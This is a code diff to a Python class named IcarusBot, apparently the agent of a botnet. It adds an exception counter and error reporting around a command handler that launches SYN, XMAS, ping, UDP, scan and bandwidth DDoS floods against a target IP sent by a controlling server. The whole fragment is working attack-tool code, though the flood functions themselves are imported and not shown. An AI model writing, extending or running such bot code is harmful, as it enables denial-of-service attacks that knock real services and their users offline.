@@ -46,6 +46,7 @@ class IcarusBot:
         self.attack_runtime = 0  # Used for tracking duration of attack.
         self.target_ip = ''
 
+        self.exceptionsThrown = 0  # Tracks errors thrown during operation.
 
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
@@ -135,7 +136,9 @@ class IcarusBot:
                         'status': self.status,
                         'id': self.bot_id,
                         'runtime': self.attack_runtime,
-                        'target': self.target_ip
+                        'target': self.target_ip,
+                        'error': 'none',
+                        'exceptionsThrown': self.exceptionsThrown
                     }
                     response = json.dumps(response)
                 elif request_type == 'attack':
@@ -143,23 +146,36 @@ class IcarusBot:
                     # TODO: Number of packets to send?
                     # Angus: We just keep running until a stop attack is issued.
                     # TODO: Specify port(s) to attack
-                    if attack_type == 'SYN_FLOOD':
-                        #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
-                        #attack_thread.start()
-                        #attack_thread.join()
-                        syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
-                    elif attack_type == 'XMAS_FLOOD':
-                        xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, ports)
-                    elif attack_type == 'PING_FLOOD':
-                        ping_flood.PING_Flood(target_ip, NUM_PACKETS_TO_SEND)
-                    elif attack_type == 'UDP_FLOOD':
-                        udp_flood.UDP_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
-                    elif attack_type == 'SCAN_FLOOD':
-                        scan_flood.SCAN_Flood(target_ip, NUM_PACKETS_TO_SEND)
-                    elif attack_type == 'BANDWIDTH_DDOS':
-                        bandwidth_ddos.BANDWIDTH_ddos(target_ip, NUM_PACKETS_TO_SEND, ports, 65495)
-                    else:
-                        print("No attack type specified")
+                    try:
+                        if attack_type == 'SYN_FLOOD':
+                            #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
+                            #attack_thread.start()
+                            #attack_thread.join()
+                            syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
+                        elif attack_type == 'XMAS_FLOOD':
+                            xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, ports)
+                        elif attack_type == 'PING_FLOOD':
+                            ping_flood.PING_Flood(target_ip, NUM_PACKETS_TO_SEND)
+                        elif attack_type == 'UDP_FLOOD':
+                            udp_flood.UDP_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
+                        elif attack_type == 'SCAN_FLOOD':
+                            scan_flood.SCAN_Flood(target_ip, NUM_PACKETS_TO_SEND)
+                        elif attack_type == 'BANDWIDTH_DDOS':
+                            bandwidth_ddos.BANDWIDTH_ddos(target_ip, NUM_PACKETS_TO_SEND, ports, 65495)
+                        else:
+                            print("No attack type specified")
+                    except Exception:
+                        self.exceptionsThrown += 1
+                        print("ERROR EXECUTING ATTACK")
+                        response = {
+                            'ip': self.ip,
+                            'status': self.status,
+                            'id': self.bot_id,
+                            'runtime': self.attack_runtime,
+                            'target': self.target_ip,
+                            'error': 'failed_starting_attack',
+                            'exceptionsThrown': self.exceptionsThrown
+                        }
 
                 # This will then send the message back to the server, irrespective of the flag.
                 time.sleep(2)
